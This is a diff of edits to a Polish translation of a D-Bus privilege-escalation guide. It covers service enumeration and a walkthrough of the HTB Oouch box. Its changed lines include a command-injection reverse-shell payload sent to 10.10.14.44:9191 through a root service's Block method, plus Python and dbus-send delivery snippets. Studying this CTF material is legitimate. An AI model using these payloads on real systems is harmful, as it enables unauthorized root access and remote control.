@@ -6,7 +6,7 @@
 
 D-Bus jest wykorzystywany jako mediator komunikacji międzyprocesowej (IPC) w środowiskach desktopowych Ubuntu. W Ubuntu obserwuje się równoczesne działanie kilku magistrali komunikacyjnych: magistrali systemowej, głównie wykorzystywanej przez **usługi z uprawnieniami do udostępniania usług istotnych dla całego systemu**, oraz magistrali sesyjnej dla każdego zalogowanego użytkownika, udostępniającej usługi istotne tylko dla tego konkretnego użytkownika. Skupiamy się tutaj głównie na magistrali systemowej ze względu na jej związek z usługami działającymi z wyższymi uprawnieniami (np. root), ponieważ naszym celem jest podniesienie uprawnień. Zauważono, że architektura D-Bus wykorzystuje 'routera' na każdą magistralę sesyjną, który odpowiada za przekierowywanie wiadomości klientów do odpowiednich usług na podstawie adresu określonego przez klientów dla usługi, z którą chcą się komunikować.
 
-Usługi na D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach OOP, przy czym każda instancja jest unikalnie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobna do ścieżki w systemie plików, unikalnie identyfikuje każdy obiekt udostępniony przez usługę. Kluczowym interfejsem do celów badawczych jest interfejs **org.freedesktop.DBus.Introspectable**, który zawiera jedną metodę, Introspect. Metoda ta zwraca reprezentację XML metod, sygnałów i właściwości obsługiwanych przez obiekt, koncentrując się tutaj na metodach, pomijając właściwości i sygnały.
+Usługi na D-Bus są definiowane przez **obiekty** i **interfejsy**, które udostępniają. Obiekty można porównać do instancji klas w standardowych językach OOP, przy czym każda instancja jest unikalnie identyfikowana przez **ścieżkę obiektu**. Ta ścieżka, podobnie jak ścieżka w systemie plików, unikalnie identyfikuje każdy obiekt udostępniany przez usługę. Kluczowym interfejsem do celów badawczych jest interfejs **org.freedesktop.DBus.Introspectable**, który zawiera jedną metodę, Introspect. Metoda ta zwraca reprezentację XML metod, sygnałów i właściwości obsługiwanych przez obiekt, koncentrując się tutaj na metodach, pomijając właściwości i sygnały.
 
 Do komunikacji z interfejsem D-Bus wykorzystano dwa narzędzia: narzędzie CLI o nazwie **gdbus** do łatwego wywoływania metod udostępnianych przez D-Bus w skryptach oraz [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), narzędzie GUI oparte na Pythonie, zaprojektowane do enumeracji usług dostępnych na każdej magistrali i wyświetlania obiektów zawartych w każdej usłudze.
 ```bash
@@ -16,13 +16,13 @@ sudo apt-get install d-feet
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-Na pierwszym obrazie pokazane są usługi zarejestrowane w systemowym busie D-Bus, z **org.debin.apt** szczególnie wyróżnionym po wybraniu przycisku System Bus. D-Feet zapytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, co widać na drugim obrazie. Podpis każdej metody jest również szczegółowo opisany.
+Na pierwszym obrazie pokazane są usługi zarejestrowane w systemowej szynie D-Bus, z **org.debin.apt** szczególnie wyróżnionym po wybraniu przycisku System Bus. D-Feet zapytuje tę usługę o obiekty, wyświetlając interfejsy, metody, właściwości i sygnały dla wybranych obiektów, co widać na drugim obrazie. Podpis każdej metody jest również szczegółowo opisany.
 
-Ciekawą cechą jest wyświetlanie **identyfikatora procesu (pid)** i **linii poleceń** usługi, co jest przydatne do potwierdzenia, czy usługa działa z podwyższonymi uprawnieniami, co jest ważne dla istotności badań.
+Cechą godną uwagi jest wyświetlanie **identyfikatora procesu (pid)** i **linii poleceń** usługi, co jest przydatne do potwierdzenia, czy usługa działa z podwyższonymi uprawnieniami, co jest ważne dla istotności badań.
 
 **D-Feet umożliwia również wywoływanie metod**: użytkownicy mogą wprowadzać wyrażenia Pythona jako parametry, które D-Feet konwertuje na typy D-Bus przed przekazaniem do usługi.
 
-Należy jednak zauważyć, że **niektóre metody wymagają uwierzytelnienia** przed pozwoleniem na ich wywołanie. Zignorujemy te metody, ponieważ naszym celem jest podniesienie naszych uprawnień bez poświadczeń w pierwszej kolejności.
+Należy jednak zauważyć, że **niektóre metody wymagają uwierzytelnienia** przed umożliwieniem ich wywołania. Zignorujemy te metody, ponieważ naszym celem jest podniesienie naszych uprawnień bez posiadania poświadczeń.
 
 Należy również zauważyć, że niektóre z usług zapytują inną usługę D-Bus o nazwie org.freedeskto.PolicyKit1, czy użytkownik powinien mieć prawo do wykonywania określonych działań, czy nie.
 
@@ -120,7 +120,7 @@ cap_mknod cap_lease cap_audit_write cap_audit_control
 cap_setfcap cap_mac_override cap_mac_admin cap_syslog
 cap_wake_alarm cap_block_suspend cap_audit_read
 ```
-### Lista interfejsów obiektu usługi
+### List Interfaces of a Service Object
 
 Musisz mieć wystarczające uprawnienia.
 ```bash
@@ -150,7 +150,7 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
-Zauważ metodę `.Block` interfejsu `htb.oouch.Block` (to jest to, co nas interesuje). "s" w innych kolumnach może oznaczać, że oczekuje ciągu znaków.
+Zauważ metodę `.Block` interfejsu `htb.oouch.Block` (to jest to, co nas interesuje). "s" w innych kolumnach może oznaczać, że oczekuje ciągu.
 
 ### Interfejs monitorowania/łapania
 
@@ -188,9 +188,9 @@ STRING "Carried out :D";
 ```
 Możesz użyć `capture` zamiast `monitor`, aby zapisać wyniki w pliku pcap.
 
-#### Filtrowanie wszystkich szumów <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
+#### Filtrowanie całego szumu <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-Jeśli na busie jest zbyt wiele informacji, przekaż regułę dopasowania w ten sposób:
+Jeśli na magistrali jest zbyt wiele informacji, przekaż regułę dopasowania w ten sposób:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
@@ -248,7 +248,7 @@ return render_template('hacker.html', title='Hacker')
 Jak widać, **nawiązuje połączenie z interfejsem D-Bus** i wysyła do **funkcji "Block"** "client_ip".
 
 Po drugiej stronie połączenia D-Bus działa skompilowany w C program binarny. Ten kod **nasłuchuje** na połączeniu D-Bus **na adres IP i wywołuje iptables za pomocą funkcji `system`**, aby zablokować dany adres IP.\
-**Wywołanie `system` jest celowo podatne na wstrzyknięcie poleceń**, więc ładunek taki jak poniższy stworzy powrotną powłokę: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+**Wywołanie `system` jest celowo podatne na wstrzyknięcie poleceń**, więc ładunek taki jak poniższy stworzy odwróconą powłokę: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
 ### Wykorzystaj to
 
@@ -262,13 +262,13 @@ r = sd_bus_add_object_vtable(bus,
 block_vtable,
 NULL);
 ```
-Również, w linii 57 możesz znaleźć, że **jedyną zarejestrowaną metodą** dla tej komunikacji D-Bus jest nazywana `Block`(_**Dlatego w następnej sekcji ładunki będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` oraz nazwy metody `Block`**_):
+Również, w linii 57 możesz znaleźć, że **jedyną zarejestrowaną metodą** dla tej komunikacji D-Bus jest nazywana `Block`(_**Dlatego w następnej sekcji ładunki będą wysyłane do obiektu usługi `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazwy metody `Block`**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
 #### Python
 
-Poniższy kod w Pythonie wyśle ładunek do połączenia D-Bus do metody `Block` za pomocą `block_iface.Block(runme)` (_zauważ, że został on wyodrębniony z poprzedniego fragmentu kodu_):
+Następujący kod w Pythonie wyśle ładunek do połączenia D-Bus do metody `Block` za pomocą `block_iface.Block(runme)` (_zauważ, że został on wyodrębniony z poprzedniego fragmentu kodu_):
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -287,7 +287,7 @@ dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oou
 - “-system” tag jest używany do oznaczenia, że jest to wiadomość systemowa, a nie wiadomość sesyjna (domyślnie).
 - “–print-reply” tag jest używany do odpowiedniego wydrukowania naszej wiadomości i odbierania wszelkich odpowiedzi w formacie czytelnym dla człowieka.
 - “–dest=Dbus-Interface-Block” Adres interfejsu Dbus.
-- “–string:” – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Z tego, “object path” jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać polecenie do interfejsu w imieniu pliku. “string:;” – To jest, aby ponownie wywołać ścieżkę obiektu, gdzie umieszczamy plik/polecenie odwróconego powłoki FIFO.
+- “–string:” – Typ wiadomości, którą chcemy wysłać do interfejsu. Istnieje kilka formatów wysyłania wiadomości, takich jak double, bytes, booleans, int, objpath. Z tego, “object path” jest przydatny, gdy chcemy wysłać ścieżkę pliku do interfejsu Dbus. W tym przypadku możemy użyć specjalnego pliku (FIFO), aby przekazać polecenie do interfejsu w nazwie pliku. “string:;” – To jest, aby ponownie wywołać ścieżkę obiektu, gdzie umieszczamy plik/polecenie reverse shell FIFO.
 
 _Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
 
@@ -434,7 +434,7 @@ return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 ```
 ## Zautomatyzowane Pomocniki do Enumeracji (2023-2025)
 
-Ręczna enumeracja dużej powierzchni ataku D-Bus za pomocą `busctl`/`gdbus` szybko staje się bolesna. Dwa małe narzędzia FOSS wydane w ostatnich latach mogą przyspieszyć proces podczas zaangażowania red-team lub CTF:
+Ręczna enumeracja dużej powierzchni ataku D-Bus za pomocą `busctl`/`gdbus` szybko staje się bolesna. Dwa małe narzędzia FOSS wydane w ostatnich latach mogą przyspieszyć proces podczas zaangażowań red-team lub CTF:
 
 ### dbusmap ("Nmap dla D-Bus")
 * Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
